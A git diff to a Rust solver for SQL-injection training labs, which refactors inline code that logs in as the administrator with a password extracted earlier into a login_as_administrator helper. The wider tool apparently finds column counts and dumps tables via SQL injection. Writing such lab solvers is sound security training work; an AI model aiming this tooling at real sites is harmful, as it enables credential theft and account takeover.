@@ -1,8 +1,8 @@
 use regex::Regex;
 use scraper::{Html, Selector};
 use sql_injection::{
-    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, check_is_lab_solved, find_columns_of_type_string,
-    find_no_of_columns, generate_clap_parser, get_csrf_token, print_tables,
+    HTTP_CLIENT, check_is_lab_solved, find_columns_of_type_string, find_no_of_columns,
+    generate_clap_parser, login_as_administrator, print_tables,
 };
 use std::iter::zip;
 use std::sync::LazyLock;
@@ -212,42 +212,7 @@ fn main() {
     if !administrator_password.is_empty() {
         logger::success(format!("Found administrator password: {administrator_password}").as_ref());
 
-        logger::info("Now logging in as administrator");
-        logger::info("Getting the login page CSRF TOKEN");
-
-        // Making a GET request to the login page
-        let response = HTTP_CLIENT
-            .get(format!("{lab_url}/login"))
-            .send()
-            .expect("[-] Failed to fetch the login page");
-
-        let login_page_csrf_token = get_csrf_token(
-            response
-                .text()
-                .expect("[-] Failed to extract login page body")
-                .as_str(),
-            &LOGIN_CSRF_TOKEN_SELECTOR,
-        );
-
-        logger::success(format!("Login Page CSRF Token: {}", login_page_csrf_token).as_ref());
-        logger::info("Performing the login bypass");
-
-        if HTTP_CLIENT
-            .post(format!("{}/login", lab_url))
-            .form(&[
-                ("csrf", login_page_csrf_token),
-                ("username", "administrator".to_string()),
-                ("password", administrator_password),
-            ])
-            .send()
-            .expect("[-] Failed to login as administrator")
-            .status()
-            == 200
-        {
-            logger::success("Login succesfully as administrator");
-        } else {
-            logger::error("Failed to login as administrator");
-        }
+        login_as_administrator(lab_url, administrator_password);
     } else {
         panic!(
             "{}",
